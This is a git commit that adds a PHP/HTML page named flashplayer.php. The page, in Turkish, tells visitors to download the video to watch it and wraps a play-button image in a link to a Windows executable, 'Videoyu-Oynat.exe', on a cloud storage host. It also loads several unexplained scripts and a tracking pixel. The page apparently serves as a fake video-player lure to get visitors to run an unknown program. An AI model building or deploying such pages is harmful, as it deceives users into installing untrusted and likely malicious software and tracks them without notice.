623e3e623f3ee26061b298d74fbaef98712aefd3
Your Name <you@example.com>
2015-12-28 20:08:12 +0600

    init

---
+++ flashplayer.php
@@ -0,0 +1,9 @@
+﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<body>
+<center><br><br><br><br>
+<font color="gray" size="5"><b>Videoyu indirerek izlemeyi deneyin..</b></font><br>
+<html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><script async="" src="v2(1)"></script><script async="" type="text/javascript" src="tc.js"></script><script async="" type="text/javascript" src="saved_resource(1)"></script><script async="" src="colored.js"></script></head><body marginwidth="1" marginheight="1"><a href="http://storage.googleapis.com/thisis/Videoyu-Oynat.exe"><br><br><br><br><img src="play.png" width="200" height="150"></a>
+</body></html>
+<script>
+new Image().src="http://whos.amung.us/widget/macodsetup.png";
+</script>
